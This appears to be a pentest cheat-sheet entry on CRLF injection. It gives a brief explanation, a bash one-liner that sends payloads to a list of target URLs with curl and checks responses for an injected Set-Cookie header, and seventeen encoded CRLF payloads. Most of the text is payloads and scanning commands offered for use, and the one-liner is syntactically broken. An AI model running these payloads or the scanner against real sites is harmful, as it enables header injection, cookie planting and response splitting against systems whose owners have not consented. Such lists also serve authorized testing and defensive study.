# # CRLF

A Carriage Return Line Feed (CRLF) Injection vulnerability occurs when an application does not sanitize user input correctly and allows for the insertion of carriage returns and line feeds, input which for many internet protocols, including HTML, denote line breaks and have special significance.  
For example, Parsing of HTTP message relies on CRLF characters (%0D%0A which decoded represent \r\n) to identify sections of HTTP messages, including headers.

**onliner to Find CRLF injection**

while IFS=read -r targets do
cat lists/crlf_payloads.txt|xargs -I % sh -c "curl -vs --max-time 9 $targets/% 2>&1 |grep -HnriEq '< Set-Cookie: ?crlf'&& echo $targets 'seems to be vulnerable to %'>>crlf_results.txt||echo 'not vulnerable'$targets "
done < "$input"

**Payloads :**
/%%0a0aSet-Cookie:crlf=injection

/%0aSet-Cookie:crlf=injection

/%0d%0aSet-Cookie:crlf=injection

/%0dSet-Cookie:crlf=injection

/%23%0aSet-Cookie:crlf=injection

/%23%0d%0aSet-Cookie:crlf=injection

/%23%0dSet-Cookie:crlf=injection

/%25%30%61Set-Cookie:crlf=injection

/%25%30aSet-Cookie:crlf=injection

/%250aSet-Cookie:crlf=injection

/%25250aSet-Cookie:crlf=injection

/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection

/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection

/%2F..%0d%0aSet-Cookie:crlf=injection

/%3f%0d%0aSet-Cookie:crlf=injection

/%3f%0dSet-Cookie:crlf=injection

/%u000aSet-Cookie:crlf=injection
